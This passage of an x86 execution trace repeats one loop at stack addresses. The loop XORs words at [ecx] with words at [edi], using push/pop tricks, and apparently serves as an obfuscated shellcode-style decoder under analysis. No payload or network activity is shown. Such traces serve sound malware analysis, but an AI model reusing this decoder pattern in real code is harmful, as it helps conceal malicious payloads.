>>    129: 50: 4  3B @0xbfc19ceb: 66 8f 01                           pop word [ecx]           nextPC: 0xbfc19cee
>>    130: 51: 4  2B @0xbfc19cee: 6a 02                              push 0x2                 nextPC: 0xbfc19cf0
>>    131: 52: 4  3B @0xbfc19cf0: 03 0c 24                           add ecx, [esp]           nextPC: 0xbfc19cf3
>>    132: 53: 4  1B @0xbfc19cf3: 5b                                 pop ebx                  nextPC: 0xbfc19cf4
>>    133: 54: 4  1B @0xbfc19cf4: 4e                                 dec esi                  nextPC: 0xbfc19cf5
>>    134: 55: 4  2B @0xbfc19cf5: 85 f6                              test esi, esi            nextPC: 0xbfc19cf7
>>    135: 36: 4  3B @0xbfc19ccd: 0f b7 17                           movzx edx, word [edi]    nextPC: 0xbfc19cd0
>>    136: 37: 4  2B @0xbfc19cd0: 6a 02                              push 0x2                 nextPC: 0xbfc19cd2
>>    137: 38: 4  3B @0xbfc19cd2: 03 3c 24                           add edi, [esp]           nextPC: 0xbfc19cd5
>>    138: 39: 4  1B @0xbfc19cd5: 5b                                 pop ebx                  nextPC: 0xbfc19cd6
>>    139: 40: 4  2B @0xbfc19cd6: ff 31                              push dword [ecx]         nextPC: 0xbfc19cd8
>>    140: 41: 4  1B @0xbfc19cd8: 58                                 pop eax                  nextPC: 0xbfc19cd9
>>    141: 42: 4  3B @0xbfc19cd9: c1 e0 10                           shl eax, 0x10            nextPC: 0xbfc19cdc
>>    142: 43: 4  3B @0xbfc19cdc: c1 e8 10                           shr eax, 0x10            nextPC: 0xbfc19cdf
>>    143: 44: 4  2B @0xbfc19cdf: 89 c3                              mov ebx, eax             nextPC: 0xbfc19ce1
>>    144: 45: 4  2B @0xbfc19ce1: 09 d3                              or ebx, edx              nextPC: 0xbfc19ce3
>>    145: 46: 4  2B @0xbfc19ce3: 21 d0                              and eax, edx             nextPC: 0xbfc19ce5
>>    146: 47: 4  2B @0xbfc19ce5: f7 d0                              not eax                  nextPC: 0xbfc19ce7
>>    147: 48: 4  2B @0xbfc19ce7: 21 d8                              and eax, ebx             nextPC: 0xbfc19ce9
>>    148: 49: 4  2B @0xbfc19ce9: 66 50                              push ax                  nextPC: 0xbfc19ceb
>>    149: 50: 4  3B @0xbfc19ceb: 66 8f 01                           pop word [ecx]           nextPC: 0xbfc19cee
>>    150: 51: 4  2B @0xbfc19cee: 6a 02                              push 0x2                 nextPC: 0xbfc19cf0
>>    151: 52: 4  3B @0xbfc19cf0: 03 0c 24                           add ecx, [esp]           nextPC: 0xbfc19cf3
>>    152: 53: 4  1B @0xbfc19cf3: 5b                                 pop ebx                  nextPC: 0xbfc19cf4
>>    153: 54: 4  1B @0xbfc19cf4: 4e                                 dec esi                  nextPC: 0xbfc19cf5
>>    154: 55: 4  2B @0xbfc19cf5: 85 f6                              test esi, esi            nextPC: 0xbfc19cf7
>>    155: 36: 4  3B @0xbfc19ccd: 0f b7 17                           movzx edx, word [edi]    nextPC: 0xbfc19cd0
>>    156: 37: 4  2B @0xbfc19cd0: 6a 02                              push 0x2                 nextPC: 0xbfc19cd2
>>    157: 38: 4  3B @0xbfc19cd2: 03 3c 24                           add edi, [esp]           nextPC: 0xbfc19cd5
>>    158: 39: 4  1B @0xbfc19cd5: 5b                                 pop ebx                  nextPC: 0xbfc19cd6
>>    159: 40: 4  2B @0xbfc19cd6: ff 31                              push dword [ecx]         nextPC: 0xbfc19cd8
>>    160: 41: 4  1B @0xbfc19cd8: 58                                 pop eax                  nextPC: 0xbfc19cd9
>>    161: 42: 4  3B @0xbfc19cd9: c1 e0 10                           shl eax, 0x10            nextPC: 0xbfc19cdc
>>    162: 43: 4  3B @0xbfc19cdc: c1 e8 10                           shr eax, 0x10            nextPC: 0xbfc19cdf
>>    163: 44: 4  2B @0xbfc19cdf: 89 c3                              mov ebx, eax             nextPC: 0xbfc19ce1
>>    164: 45: 4  2B @0xbfc19ce1: 09 d3                              or ebx, edx              nextPC: 0xbfc19ce3
>>    165: 46: 4  2B @0xbfc19ce3: 21 d0                              and eax, edx             nextPC: 0xbfc19ce5
>>    166: 47: 4  2B @0xbfc19ce5: f7 d0                              not eax                  nextPC: 0xbfc19ce7
>>    167: 48: 4  2B @0xbfc19ce7: 21 d8                              and eax, ebx             nextPC: 0xbfc19ce9
>>    168: 49: 4  2B @0xbfc19ce9: 66 50                              push ax                  nextPC: 0xbfc19ceb
>>    169: 50: 4  3B @0xbfc19ceb: 66 8f 01                           pop word [ecx]           nextPC: 0xbfc19cee
>>    170: 51: 4  2B @0xbfc19cee: 6a 02                              push 0x2                 nextPC: 0xbfc19cf0
>>    171: 52: 4  3B @0xbfc19cf0: 03 0c 24                           add ecx, [esp]           nextPC: 0xbfc19cf3
>>    172: 53: 4  1B @0xbfc19cf3: 5b                                 pop ebx                  nextPC: 0xbfc19cf4
>>    173: 54: 4  1B @0xbfc19cf4: 4e                                 dec esi                  nextPC: 0xbfc19cf5
>>    174: 55: 4  2B @0xbfc19cf5: 85 f6                              test esi, esi            nextPC: 0xbfc19cf7
>>    175: 36: 4  3B @0xbfc19ccd: 0f b7 17                           movzx edx, word [edi]    nextPC: 0xbfc19cd0
>>    176: 37: 4  2B @0xbfc19cd0: 6a 02                              push 0x2                 nextPC: 0xbfc19cd2
>>    177: 38: 4  3B @0xbfc19cd2: 03 3c 24                           add edi, [esp]           nextPC: 0xbfc19cd5
>>    178: 39: 4  1B @0xbfc19cd5: 5b                                 pop ebx                  nextPC: 0xbfc19cd6
>>    179: 40: 4  2B @0xbfc19cd6: ff 31                              push dword [ecx]         nextPC: 0xbfc19cd8
>>    180: 41: 4  1B @0xbfc19cd8: 58                                 pop eax                  nextPC: 0xbfc19cd9
>>    181: 42: 4  3B @0xbfc19cd9: c1 e0 10                           shl eax, 0x10            nextPC: 0xbfc19cdc
>>    182: 43: 4  3B @0xbfc19cdc: c1 e8 10                           shr eax, 0x10            nextPC: 0xbfc19cdf
>>    183: 44: 4  2B @0xbfc19cdf: 89 c3                              mov ebx, eax             nextPC: 0xbfc19ce1
>>    184: 45: 4  2B @0xbfc19ce1: 09 d3                              or ebx, edx              nextPC: 0xbfc19ce3
>>    185: 46: 4  2B @0xbfc19ce3: 21 d0                              and eax, edx             nextPC: 0xbfc19ce5
>>    186: 47: 4  2B @0xbfc19ce5: f7 d0                              not eax                  nextPC: 0xbfc19ce7
>>    187: 48: 4  2B @0xbfc19ce7: 21 d8                              and eax, ebx             nextPC: 0xbfc19ce9
>>    188: 49: 4  2B @0xbfc19ce9: 66 50                              push ax                  nextPC: 0xbfc19ceb
>>    189: 50: 4  3B @0xbfc19ceb: 66 8f 01                           pop word [ecx]           nextPC: 0xbfc19cee
>>    190: 51: 4  2B @0xbfc19cee: 6a 02                              push 0x2                 nextPC: 0xbfc19cf0
>>    191: 52: 4  3B @0xbfc19cf0: 03 0c 24                           add ecx, [esp]           nextPC: 0xbfc19cf3
>>    192: 53: 4  1B @0xbfc19cf3: 5b                                 pop ebx                  nextPC: 0xbfc19cf4
>>    193: 54: 4  1B @0xbfc19cf4: 4e                                 dec esi                  nextPC: 0xbfc19cf5
>>    194: 55: 4  2B @0xbfc19cf5: 85 f6                              test esi, esi            nextPC: 0xbfc19cf7
>>    195: 36: 4  3B @0xbfc19ccd: 0f b7 17                           movzx edx, word [edi]    nextPC: 0xbfc19cd0
>>    196: 37: 4  2B @0xbfc19cd0: 6a 02                              push 0x2                 nextPC: 0xbfc19cd2
>>    197: 38: 4  3B @0xbfc19cd2: 03 3c 24                           add edi, [esp]           nextPC: 0xbfc19cd5
>>    198: 39: 4  1B @0xbfc19cd5: 5b                                 pop ebx                  nextPC: 0xbfc19cd6
>>    199: 40: 4  2B @0xbfc19cd6: ff 31                              push dword [ecx]         nextPC: 0xbfc19cd8
>>    200: 41: 4  1B @0xbfc19cd8: 58                                 pop eax                  nextPC: 0xbfc19cd9
>>    201: 42: 4  3B @0xbfc19cd9: c1 e0 10                           shl eax, 0x10            nextPC: 0xbfc19cdc
>>    202: 43: 4  3B @0xbfc19cdc: c1 e8 10                           shr eax, 0x10            nextPC: 0xbfc19cdf
>>    203: 44: 4  2B @0xbfc19cdf: 89 c3                              mov ebx, eax             nextPC: 0xbfc19ce1
>>    204: 45: 4  2B @0xbfc19ce1: 09 d3                              or ebx, edx              nextPC: 0xbfc19ce3
>>    205: 46: 4  2B @0xbfc19ce3: 21 d0                              and eax, edx             nextPC: 0xbfc19ce5
>>    206: 47: 4  2B @0xbfc19ce5: f7 d0                              not eax                  nextPC: 0xbfc19ce7
>>    207: 48: 4  2B @0xbfc19ce7: 21 d8                              and eax, ebx             nextPC: 0xbfc19ce9
>>    208: 49: 4  2B @0xbfc19ce9: 66 50                              push ax                  nextPC: 0xbfc19ceb
>>    209: 50: 4  3B @0xbfc19ceb: 66 8f 01                           pop word [ecx]           nextPC: 0xbfc19cee
>>    210: 51: 4  2B @0xbfc19cee: 6a 02                              push 0x2                 nextPC: 0xbfc19cf0
>>    211: 52: 4  3B @0xbfc19cf0: 03 0c 24                           add ecx, [esp]           nextPC: 0xbfc19cf3
>>    212: 53: 4  1B @0xbfc19cf3: 5b                                 pop ebx                  nextPC: 0xbfc19cf4
>>    213: 54: 4  1B @0xbfc19cf4: 4e                                 dec esi                  nextPC: 0xbfc19cf5
>>    214: 55: 4  2B @0xbfc19cf5: 85 f6                              test esi, esi            nextPC: 0xbfc19cf7
>>    215: 36: 4  3B @0xbfc19ccd: 0f b7 17                           movzx edx, word [edi]    nextPC: 0xbfc19cd0
>>    216: 37: 4  2B @0xbfc19cd0: 6a 02                              push 0x2                 nextPC: 0xbfc19cd2
>>    217: 38: 4  3B @0xbfc19cd2: 03 3c 24                           add edi, [esp]           nextPC: 0xbfc19cd5
>>    218: 39: 4  1B @0xbfc19cd5: 5b                                 pop ebx                  nextPC: 0xbfc19cd6
>>    219: 40: 4  2B @0xbfc19cd6: ff 31                              push dword [ecx]         nextPC: 0xbfc19cd8
>>    220: 41: 4  1B @0xbfc19cd8: 58                                 pop eax                  nextPC: 0xbfc19cd9
>>    221: 42: 4  3B @0xbfc19cd9: c1 e0 10                           shl eax, 0x10            nextPC: 0xbfc19cdc
>>    222: 43: 4  3B @0xbfc19cdc: c1 e8 10                           shr eax, 0x10            nextPC: 0xbfc19cdf
>>    223: 44: 4  2B @0xbfc19cdf: 89 c3                              mov ebx, eax             nextPC: 0xbfc19ce1
>>    224: 45: 4  2B @0xbfc19ce1: 09 d3                              or ebx, edx              nextPC: 0xbfc19ce3
>>    225: 46: 4  2B @0xbfc19ce3: 21 d0                              and eax, edx             nextPC: 0xbfc19ce5
>>    226: 47: 4  2B @0xbfc19ce5: f7 d0                              not eax                  nextPC: 0xbfc19ce7
>>    227: 48: 4  2B @0xbfc19ce7: 21 d8                              and eax, ebx             nextPC: 0xbfc19ce9
>>    228: 49: 4  2B @0xbfc19ce9: 66 50                              push ax                  nextPC: 0xbfc19ceb
>>    229: 50: 4  3B @0xbfc19ceb: 66 8f 01                           pop word [ecx]           nextPC: 0xbfc19cee
>>    230: 51: 4  2B @0xbfc19cee: 6a 02                              push 0x2                 nextPC: 0xbfc19cf0
>>    231: 52: 4  3B @0xbfc19cf0: 03 0c 24                           add ecx, [esp]           nextPC: 0xbfc19cf3
>>    232: 53: 4  1B @0xbfc19cf3: 5b                                 pop ebx                  nextPC: 0xbfc19cf4
>>    233: 54: 4  1B @0xbfc19cf4: 4e                                 dec esi                  nextPC: 0xbfc19cf5
>>    234: 55: 4  2B @0xbfc19cf5: 85 f6                              test esi, esi            nextPC: 0xbfc19cf7
>>    235: 36: 4  3B @0xbfc19ccd: 0f b7 17                           movzx edx, word [edi]    nextPC: 0xbfc19cd0
>>    236: 37: 4  2B @0xbfc19cd0: 6a 02                              push 0x2                 nextPC: 0xbfc19cd2
>>    237: 38: 4  3B @0xbfc19cd2: 03 3c 24                           add edi, [esp]           nextPC: 0xbfc19cd5
>>    238: 39: 4  1B @0xbfc19cd5: 5b                                 pop ebx                  nextPC: 0xbfc19cd6
>>    239: 40: 4  2B @0xbfc19cd6: ff 31                              push dword [ecx]         nextPC: 0xbfc19cd8
>>    240: 41: 4  1B @0xbfc19cd8: 58                                 pop eax                  nextPC: 0xbfc19cd9
>>    241: 42: 4  3B @0xbfc19cd9: c1 e0 10                           shl eax, 0x10            nextPC: 0xbfc19cdc
>>    242: 43: 4  3B @0xbfc19cdc: c1 e8 10                           shr eax, 0x10            nextPC: 0xbfc19cdf
>>    243: 44: 4  2B @0xbfc19cdf: 89 c3                              mov ebx, eax             nextPC: 0xbfc19ce1
>>    244: 45: 4  2B @0xbfc19ce1: 09 d3                              or ebx, edx              nextPC: 0xbfc19ce3
>>    245: 46: 4  2B @0xbfc19ce3: 21 d0                              and eax, edx             nextPC: 0xbfc19ce5
>>    246: 47: 4  2B @0xbfc19ce5: f7 d0                              not eax                  nextPC: 0xbfc19ce7
>>    247: 48: 4  2B @0xbfc19ce7: 21 d8                              and eax, ebx             nextPC: 0xbfc19ce9
>>    248: 49: 4  2B @0xbfc19ce9: 66 50                              push ax                  nextPC: 0xbfc19ceb
>>    249: 50: 4  3B @0xbfc19ceb: 66 8f 01                           pop word [ecx]           nextPC: 0xbfc19cee
>>    250: 51: 4  2B @0xbfc19cee: 6a 02                              push 0x2                 nextPC: 0xbfc19cf0
>>    251: 52: 4  3B @0xbfc19cf0: 03 0c 24                           add ecx, [esp]           nextPC: 0xbfc19cf3
>>    252: 53: 4  1B @0xbfc19cf3: 5b                                 pop ebx                  nextPC: 0xbfc19cf4
>>    253: 54: 4  1B @0xbfc19cf4: 4e                                 dec esi                  nextPC: 0xbfc19cf5
>>    254: 55: 4  2B @0xbfc19cf5: 85 f6                              test esi, esi            nextPC: 0xbfc19cf7
>>    255: 36: 4  3B @0xbfc19ccd: 0f b7 17                           movzx edx, word [edi]    nextPC: 0xbfc19cd0
>>    256: 37: 4  2B @0xbfc19cd0: 6a 02                              push 0x2                 nextPC: 0xbfc19cd2
>>    257: 38: 4  3B @0xbfc19cd2: 03 3c 24                           add edi, [esp]           nextPC: 0xbfc19cd5
>>    258: 39: 4  1B @0xbfc19cd5: 5b                                 pop ebx                  nextPC: 0xbfc19cd6
>>    259: 40: 4  2B @0xbfc19cd6: ff 31                              push dword [ecx]         nextPC: 0xbfc19cd8
>>    260: 41: 4  1B @0xbfc19cd8: 58                                 pop eax                  nextPC: 0xbfc19cd9
>>    261: 42: 4  3B @0xbfc19cd9: c1 e0 10                           shl eax, 0x10            nextPC: 0xbfc19cdc
>>    262: 43: 4  3B @0xbfc19cdc: c1 e8 10                           shr eax, 0x10            nextPC: 0xbfc19cdf
>>    263: 44: 4  2B @0xbfc19cdf: 89 c3                              mov ebx, eax             nextPC: 0xbfc19ce1
>>    264: 45: 4  2B @0xbfc19ce1: 09 d3                              or ebx, edx              nextPC: 0xbfc19ce3
>>    265: 46: 4  2B @0xbfc19ce3: 21 d0                              and eax, edx             nextPC: 0xbfc19ce5
>>    266: 47: 4  2B @0xbfc19ce5: f7 d0                              not eax                  nextPC: 0xbfc19ce7
>>    267: 48: 4  2B @0xbfc19ce7: 21 d8                              and eax, ebx             nextPC: 0xbfc19ce9
>>    268: 49: 4  2B @0xbfc19ce9: 66 50                              push ax                  nextPC: 0xbfc19ceb
>>    269: 50: 4  3B @0xbfc19ceb: 66 8f 01                           pop word [ecx]           nextPC: 0xbfc19cee
>>    270: 51: 4  2B @0xbfc19cee: 6a 02                              push 0x2                 nextPC: 0xbfc19cf0
>>    271: 52: 4  3B @0xbfc19cf0: 03 0c 24                           add ecx, [esp]           nextPC: 0xbfc19cf3
>>    272: 53: 4  1B @0xbfc19cf3: 5b                                 pop ebx                  nextPC: 0xbfc19cf4
>>    273: 54: 4  1B @0xbfc19cf4: 4e                                 dec esi                  nextPC: 0xbfc19cf5
>>    274: 55: 4  2B @0xbfc19cf5: 85 f6                              test esi, esi            nextPC: 0xbfc19cf7
>>    275: 36: 4  3B @0xbfc19ccd: 0f b7 17                           movzx edx, word [edi]    nextPC: 0xbfc19cd0
>>    276: 37: 4  2B @0xbfc19cd0: 6a 02                              push 0x2                 nextPC: 0xbfc19cd2
>>    277: 38: 4  3B @0xbfc19cd2: 03 3c 24                           add edi, [esp]           nextPC: 0xbfc19cd5
>>    278: 39: 4  1B @0xbfc19cd5: 5b                                 pop ebx                  nextPC: 0xbfc19cd6
>>    279: 40: 4  2B @0xbfc19cd6: ff 31                              push dword [ecx]         nextPC: 0xbfc19cd8
>>    280: 41: 4  1B @0xbfc19cd8: 58                                 pop eax                  nextPC: 0xbfc19cd9
>>    281: 42: 4  3B @0xbfc19cd9: c1 e0 10                           shl eax, 0x10            nextPC: 0xbfc19cdc
>>    282: 43: 4  3B @0xbfc19cdc: c1 e8 10                           shr eax, 0x10            nextPC: 0xbfc19cdf
>>    283: 44: 4  2B @0xbfc19cdf: 89 c3                              mov ebx, eax             nextPC: 0xbfc19ce1
>>    284: 45: 4  2B @0xbfc19ce1: 09 d3                              or ebx, edx              nextPC: 0xbfc19ce3
>>    285: 46: 4  2B @0xbfc19ce3: 21 d0                              and eax, edx             nextPC: 0xbfc19ce5
>>    286: 47: 4  2B @0xbfc19ce5: f7 d0                              not eax                  nextPC: 0xbfc19ce7
>>    287: 48: 4  2B @0xbfc19ce7: 21 d8                              and eax, ebx             nextPC: 0xbfc19ce9
>>    288: 49: 4  2B @0xbfc19ce9: 66 50                              push ax                  nextPC: 0xbfc19ceb
>>    289: 50: 4  3B @0xbfc19ceb: 66 8f 01                           pop word [ecx]           nextPC: 0xbfc19cee
>>    290: 51: 4  2B @0xbfc19cee: 6a 02                              push 0x2                 nextPC: 0xbfc19cf0
>>    291: 52: 4  3B @0xbfc19cf0: 03 0c 24                           add ecx, [esp]           nextPC: 0xbfc19cf3
>>    292: 53: 4  1B @0xbfc19cf3: 5b                                 pop ebx                  nextPC: 0xbfc19cf4
>>    293: 54: 4  1B @0xbfc19cf4: 4e                                 dec esi                  nextPC: 0xbfc19cf5
>>    294: 55: 4  2B @0xbfc19cf5: 85 f6                              test esi, esi            nextPC: 0xbfc19cf7
>>    295: 36: 4  3B @0xbfc19ccd: 0f b7 17                           movzx edx, word [edi]    nextPC: 0xbfc19cd0
>>    296: 37: 4  2B @0xbfc19cd0: 6a 02                              push 0x2                 nextPC: 0xbfc19cd2
>>    297: 38: 4  3B @0xbfc19cd2: 03 3c 24                           add edi, [esp]           nextPC: 0xbfc19cd5
>>    298: 39: 4  1B @0xbfc19cd5: 5b                                 pop ebx                  nextPC: 0xbfc19cd6
>>    299: 40: 4  2B @0xbfc19cd6: ff 31                              push dword [ecx]         nextPC: 0xbfc19cd8
>>    300: 41: 4  1B @0xbfc19cd8: 58                                 pop eax                  nextPC: 0xbfc19cd9
>>    301: 42: 4  3B @0xbfc19cd9: c1 e0 10                           shl eax, 0x10            nextPC: 0xbfc19cdc
>>    302: 43: 4  3B @0xbfc19cdc: c1 e8 10                           shr eax, 0x10            nextPC: 0xbfc19cdf
>>    303: 44: 4  2B @0xbfc19cdf: 89 c3                              mov ebx, eax             nextPC: 0xbfc19ce1
>>    304: 45: 4  2B @0xbfc19ce1: 09 d3                              or ebx, edx              nextPC: 0xbfc19ce3
>>    305: 46: 4  2B @0xbfc19ce3: 21 d0                              and eax, edx             nextPC: 0xbfc19ce5
>>    306: 47: 4  2B @0xbfc19ce5: f7 d0                              not eax                  nextPC: 0xbfc19ce7
>>    307: 48: 4  2B @0xbfc19ce7: 21 d8                              and eax, ebx             nextPC: 0xbfc19ce9
>>    308: 49: 4  2B @0xbfc19ce9: 66 50                              push ax                  nextPC: 0xbfc19ceb
>>    309: 50: 4  3B @0xbfc19ceb: 66 8f 01                           pop word [ecx]           nextPC: 0xbfc19cee
>>    310: 51: 4  2B @0xbfc19cee: 6a 02                              push 0x2                 nextPC: 0xbfc19cf0
>>    311: 52: 4  3B @0xbfc19cf0: 03 0c 24                           add ecx, [esp]           nextPC: 0xbfc19cf3
>>    312: 53: 4  1B @0xbfc19cf3: 5b                                 pop ebx                  nextPC: 0xbfc19cf4
>>    313: 54: 4  1B @0xbfc19cf4: 4e                                 dec esi                  nextPC: 0xbfc19cf5
>>    314: 55: 4  2B @0xbfc19cf5: 85 f6                              test esi, esi            nextPC: 0xbfc19cf7
>>    315: 36: 4  3B @0xbfc19ccd: 0f b7 17                           movzx edx, word [edi]    nextPC: 0xbfc19cd0
>>    316: 37: 4  2B @0xbfc19cd0: 6a 02                              push 0x2                 nextPC: 0xbfc19cd2
>>    317: 38: 4  3B @0xbfc19cd2: 03 3c 24                           add edi, [esp]           nextPC: 0xbfc19cd5
>>    318: 39: 4  1B @0xbfc19cd5: 5b                                 pop ebx                  nextPC: 0xbfc19cd6
>>    319: 40: 4  2B @0xbfc19cd6: ff 31                              push dword [ecx]         nextPC: 0xbfc19cd8
>>    320: 41: 4  1B @0xbfc19cd8: 58                                 pop eax                  nextPC: 0xbfc19cd9
>>    321: 42: 4  3B @0xbfc19cd9: c1 e0 10                           shl eax, 0x10            nextPC: 0xbfc19cdc
>>    322: 43: 4  3B @0xbfc19cdc: c1 e8 10                           shr eax, 0x10            nextPC: 0xbfc19cdf
>>    323: 44: 4  2B @0xbfc19cdf: 89 c3                              mov ebx, eax             nextPC: 0xbfc19ce1
>>    324: 45: 4  2B @0xbfc19ce1: 09 d3                              or ebx, edx              nextPC: 0xbfc19ce3
>>    325: 46: 4  2B @0xbfc19ce3: 21 d0                              and eax, edx             nextPC: 0xbfc19ce5
>>    326: 47: 4  2B @0xbfc19ce5: f7 d0                              not eax                  nextPC: 0xbfc19ce7
>>    327: 48: 4  2B @0xbfc19ce7: 21 d8                              and eax, ebx             nextPC: 0xbfc19ce9
>>    328: 49: 4  2B @0xbfc19ce9: 66 50                              push ax                  nextPC: 0xbfc19ceb
>>    329: 50: 4  3B @0xbfc19ceb: 66 8f 01                           pop word [ecx]           nextPC: 0xbfc19cee
>>    330: 51: 4  2B @0xbfc19cee: 6a 02                              push 0x2                 nextPC: 0xbfc19cf0
>>    331: 52: 4  3B @0xbfc19cf0: 03 0c 24                           add ecx, [esp]           nextPC: 0xbfc19cf3
>>    332: 53: 4  1B @0xbfc19cf3: 5b                                 pop ebx                  nextPC: 0xbfc19cf4
>>    333: 54: 4  1B @0xbfc19cf4: 4e                                 dec esi                  nextPC: 0xbfc19cf5
>>    334: 55: 4  2B @0xbfc19cf5: 85 f6                              test esi, esi            nextPC: 0xbfc19cf7
>>    335: 36: 4  3B @0xbfc19ccd: 0f b7 17                           movzx edx, word [edi]    nextPC: 0xbfc19cd0
>>    336: 37: 4  2B @0xbfc19cd0: 6a 02                              push 0x2                 nextPC: 0xbfc19cd2
>>    337: 38: 4  3B @0xbfc19cd2: 03 3c 24                           add edi, [esp]           nextPC: 0xbfc19cd5
>>    338: 39: 4  1B @0xbfc19cd5: 5b                                 pop ebx                  nextPC: 0xbfc19cd6
>>    339: 40: 4  2B @0xbfc19cd6: ff 31                              push dword [ecx]         nextPC: 0xbfc19cd8
>>    340: 41: 4  1B @0xbfc19cd8: 58                                 pop eax                  nextPC: 0xbfc19cd9
>>    341: 42: 4  3B @0xbfc19cd9: c1 e0 10                           shl eax, 0x10            nextPC: 0xbfc19cdc
>>    342: 43: 4  3B @0xbfc19cdc: c1 e8 10                           shr eax, 0x10            nextPC: 0xbfc19cdf
>>    343: 44: 4  2B @0xbfc19cdf: 89 c3                              mov ebx, eax             nextPC: 0xbfc19ce1
>>    344: 45: 4  2B @0xbfc19ce1: 09 d3                              or ebx, edx              nextPC: 0xbfc19ce3
>>    345: 46: 4  2B @0xbfc19ce3: 21 d0                              and eax, edx             nextPC: 0xbfc19ce5
>>    346: 47: 4  2B @0xbfc19ce5: f7 d0                              not eax                  nextPC: 0xbfc19ce7
>>    347: 48: 4  2B @0xbfc19ce7: 21 d8                              and eax, ebx             nextPC: 0xbfc19ce9
>>    348: 49: 4  2B @0xbfc19ce9: 66 50                              push ax                  nextPC: 0xbfc19ceb
>>    349: 50: 4  3B @0xbfc19ceb: 66 8f 01                           pop word [ecx]           nextPC: 0xbfc19cee
>>    350: 51: 4  2B @0xbfc19cee: 6a 02                              push 0x2                 nextPC: 0xbfc19cf0
>>    351: 52: 4  3B @0xbfc19cf0: 03 0c 24                           add ecx, [esp]           nextPC: 0xbfc19cf3
>>    352: 53: 4  1B @0xbfc19cf3: 5b                                 pop ebx                  nextPC: 0xbfc19cf4
>>    353: 54: 4  1B @0xbfc19cf4: 4e                                 dec esi                  nextPC: 0xbfc19cf5
>>    354: 55: 4  2B @0xbfc19cf5: 85 f6                              test esi, esi            nextPC: 0xbfc19cf7
>>    355: 36: 4  3B @0xbfc19ccd: 0f b7 17                           movzx edx, word [edi]    nextPC: 0xbfc19cd0
>>    356: 37: 4  2B @0xbfc19cd0: 6a 02                              push 0x2                 nextPC: 0xbfc19cd2
>>    357: 38: 4  3B @0xbfc19cd2: 03 3c 24                           add edi, [esp]           nextPC: 0xbfc19cd5
>>    358: 39: 4  1B @0xbfc19cd5: 5b                                 pop ebx                  nextPC: 0xbfc19cd6
>>    359: 40: 4  2B @0xbfc19cd6: ff 31                              push dword [ecx]         nextPC: 0xbfc19cd8
>>    360: 41: 4  1B @0xbfc19cd8: 58                                 pop eax                  nextPC: 0xbfc19cd9
>>    361: 42: 4  3B @0xbfc19cd9: c1 e0 10                           shl eax, 0x10            nextPC: 0xbfc19cdc
>>    362: 43: 4  3B @0xbfc19cdc: c1 e8 10                           shr eax, 0x10            nextPC: 0xbfc19cdf
>>    363: 44: 4  2B @0xbfc19cdf: 89 c3                              mov ebx, eax             nextPC: 0xbfc19ce1
>>    364: 45: 4  2B @0xbfc19ce1: 09 d3                              or ebx, edx              nextPC: 0xbfc19ce3
>>    365: 46: 4  2B @0xbfc19ce3: 21 d0                              and eax, edx             nextPC: 0xbfc19ce5
>>    366: 47: 4  2B @0xbfc19ce5: f7 d0                              not eax                  nextPC: 0xbfc19ce7
>>    367: 48: 4  2B @0xbfc19ce7: 21 d8                              and eax, ebx             nextPC: 0xbfc19ce9
>>    368: 49: 4  2B @0xbfc19ce9: 66 50                              push ax                  nextPC: 0xbfc19ceb
>>    369: 50: 4  3B @0xbfc19ceb: 66 8f 01                           pop word [ecx]           nextPC: 0xbfc19cee
>>    370: 51: 4  2B @0xbfc19cee: 6a 02                              push 0x2                 nextPC: 0xbfc19cf0
>>    371: 52: 4  3B @0xbfc19cf0: 03 0c 24                           add ecx, [esp]           nextPC: 0xbfc19cf3
>>    372: 53: 4  1B @0xbfc19cf3: 5b                                 pop ebx                  nextPC: 0xbfc19cf4
>>    373: 54: 4  1B @0xbfc19cf4: 4e                                 dec esi                  nextPC: 0xbfc19cf5
>>    374: 55: 4  2B @0xbfc19cf5: 85 f6                              test esi, esi            nextPC: 0xbfc19cf7
>>    375: 36: 4  3B @0xbfc19ccd: 0f b7 17                           movzx edx, word [edi]    nextPC: 0xbfc19cd0
>>    376: 37: 4  2B @0xbfc19cd0: 6a 02                              push 0x2                 nextPC: 0xbfc19cd2
>>    377: 38: 4  3B @0xbfc19cd2: 03 3c 24                           add edi, [esp]           nextPC: 0xbfc19cd5
>>    378: 39: 4  1B @0xbfc19cd5: 5b                                 pop ebx                  nextPC: 0xbfc19cd6
>>    379: 40: 4  2B @0xbfc19cd6: ff 31                              push dword [ecx]         nextPC: 0xbfc19cd8
>>    380: 41: 4  1B @0xbfc19cd8: 58                                 pop eax                  nextPC: 0xbfc19cd9
>>    381: 42: 4  3B @0xbfc19cd9: c1 e0 10                           shl eax, 0x10            nextPC: 0xbfc19cdc
>>    382: 43: 4  3B @0xbfc19cdc: c1 e8 10                           shr eax, 0x10            nextPC: 0xbfc19cdf
>>    383: 44: 4  2B @0xbfc19cdf: 89 c3                              mov ebx, eax             nextPC: 0xbfc19ce1
>>    384: 45: 4  2B @0xbfc19ce1: 09 d3                              or ebx, edx              nextPC: 0xbfc19ce3
>>    385: 46: 4  2B @0xbfc19ce3: 21 d0                              and eax, edx             nextPC: 0xbfc19ce5
>>    386: 47: 4  2B @0xbfc19ce5: f7 d0                              not eax                  nextPC: 0xbfc19ce7
>>    387: 48: 4  2B @0xbfc19ce7: 21 d8                              and eax, ebx             nextPC: 0xbfc19ce9
>>    388: 49: 4  2B @0xbfc19ce9: 66 50                              push ax                  nextPC: 0xbfc19ceb
>>    389: 50: 4  3B @0xbfc19ceb: 66 8f 01                           pop word [ecx]           nextPC: 0xbfc19cee
>>    390: 51: 4  2B @0xbfc19cee: 6a 02                              push 0x2                 nextPC: 0xbfc19cf0
>>    391: 52: 4  3B @0xbfc19cf0: 03 0c 24                           add ecx, [esp]           nextPC: 0xbfc19cf3
>>    392: 53: 4  1B @0xbfc19cf3: 5b                                 pop ebx                  nextPC: 0xbfc19cf4
>>    393: 54: 4  1B @0xbfc19cf4: 4e                                 dec esi                  nextPC: 0xbfc19cf5
>>    394: 55: 4  2B @0xbfc19cf5: 85 f6                              test esi, esi            nextPC: 0xbfc19cf7
>>    395: 36: 4  3B @0xbfc19ccd: 0f b7 17                           movzx edx, word [edi]    nextPC: 0xbfc19cd0
>>    396: 37: 4  2B @0xbfc19cd0: 6a 02                              push 0x2                 nextPC: 0xbfc19cd2
>>    397: 38: 4  3B @0xbfc19cd2: 03 3c 24                           add edi, [esp]           nextPC: 0xbfc19cd5
>>    398: 39: 4  1B @0xbfc19cd5: 5b                                 pop ebx                  nextPC: 0xbfc19cd6
>>    399: 40: 4  2B @0xbfc19cd6: ff 31                              push dword [ecx]         nextPC: 0xbfc19cd8
>>    400: 41: 4  1B @0xbfc19cd8: 58                                 pop eax                  nextPC: 0xbfc19cd9
